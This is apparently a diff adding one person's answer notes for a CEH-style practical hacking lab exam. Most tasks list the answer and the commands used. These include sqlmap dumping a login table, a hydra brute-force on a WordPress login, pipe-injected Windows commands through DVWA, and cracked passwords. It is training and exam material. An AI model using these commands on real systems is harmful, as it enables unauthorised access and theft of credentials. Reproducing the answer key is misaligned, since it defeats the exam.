@@ -1,0 +1,103 @@
+1.Perform an HTTP-recon on www.certifiedhacker.com and find out the version of Nginx used by the web server.
+1.21.6-(Correct Attempt)
+
+whatweb www.certifiedhacker.com
+nginx/1.21.6
+
+2.An FTP site is hosted on a machine in the CEHORG network. Crack the FTP credentials, obtain the “flag.txt” file and determine the content in the file.
+
+
+3.Perform web application reconnaissance on movies.cehorg.com and find out the HTTP server used by the web application.
+Microsoft-IIS/10.0-(Correct Attempt)
+
+whatweb movies.cehorg.com
+
+
+4.Perform a SQL Injection attack on movies.cehorg.com and find out the number of users available in the database. Use Jason/welcome as login credentials.
+9-(Correct Attempt)
+
+sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie='mscope=Xfanda2RM2w=; ui-tabs-1=0' --dbs
+
+sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie='mscope=Xfanda2RM2w=; ui-tabs-1=0' -D moviescope --tables
+
+sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie='mscope=Xfanda2RM2w=; ui-tabs-1=0' -D moviescope -T User_Login --dump
+
+
+
+5.Identify the load balancing service used by eccouncil.org.
+cloudflare-(Correct Attempt)
+
+lbd eccouncil.org
+
+
+6.Identify the Content Management System used by www.cehorg.com.
+WordPress-(Correct Attempt)
+
+whatweb www.cehorg.com
+
+
+7.Perform a bruteforce attack on www.cehorg.com and find the password of user adam.
+orange1234-(Correct Attempt)
+
+use burp to crack or to get the url and use hydra
+
+hydra -l adam -P password.txt www.cehorg.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fcehorg.com%2Fwp-admin%2F&testcookie=1:Error" -V
+
+
+
+8.Perform parameter tampering on movies.cehorg.com and find out the user for id 1003.
+Linda-(Correct Attempt)
+http://movies.cehorg.com/viewprofile.aspx?id=1003
+
+
+9.You have identified a vulnerable web application on a Linux server at port 8080. Exploit the web application vulnerability, gain access to the server and enter the content of RootFlag.txt as the answer.
+
+
+
+
+10.You have been assigned a task to perform a clickjacking test on www.certifiedhacker.com that the CEHORG members widely use. Find out whether the site is vulnerable to clickjacking.
+Yes-(Correct Attempt)
+
+python3 clickJacKPot -f domain.txt
+clickjacker.io
+
+
+
+11.Perform command injection attack on 10.10.10.25 and find out how many user accounts are registered with the machine. Note: Exclude admin/Guest user
+enum4linux -U -o 10.10.10.25
+nmap --script smb-enum-users -p445 10.10.10.25
+
+12.A file named Hash.txt has been uploaded through DVWA (http://10.10.10.25:8080/DVWA). The file is located in the directory mentioned below. Access the file and crack the MD5 hash to reveal the original message; enter the content after cracking the hash. You can log into the DVWA using the following credentials. Note: Username- admin; Password- password Path: C:\wamp64\www\DVWA\hackable\uploads\Hash.txt Hint: Use “type” command to view the file. Use the following link to decrypt the hash- https://hashes.com/en/decrypt/hash
+Cr@ck3d-(Correct Attempt)
+
+| dir "C:\wamp64\www\DVWA\hackable\uploads"
+| type "C:\wamp64\www\DVWA\hackable\uploads\Hash.txt"
+37ehh7qwhdq7eh73he7qhe73e7
+crackstation
+
+
+13.Perform Banner grabbing on the web application movies.cehorg.com and find out the ETag of the respective target machine.
+"8d13646dbb9bd61:0"-(Correct Attempt)
+
+telnet movies.cehorg.com 80
+GET / HTTP/1.0 
+
+
+14.Perform Web Crawling on the web application movies.cehorg.com and identify the number of live png files in images folder.
+6-(Correct Attempt)
+using vega in windows
+
+
+15.Perform XSS vulnerability test on www.cehorg.com and identify whether the application is vulnerable to attack or not. (Yes/No).
+No-(Correct Attempt)
+git clone https://github.com/s0md3v/XSStrike.git
+pip install -r requeriments.txt
+python3 xsstrike.py -u http://www.cehorg.com/?p=1
+
+python3 pwnxss.py -u http://www.cehorg.com
+
+
+16.CEHORG suspects of a possible session hijacking attack on a machine in its network. The organisation has retained the network traffic data for the session at C:\Users\Admin\Documents in the EH Workstation – 2 as sniffsession.pcap. You have been assigned a task to perform an analysis and find out the protocol that has been used for sniffing on its network.
+ARP-(Correct Attempt)
+arp
+arp. duplicate-address-frame
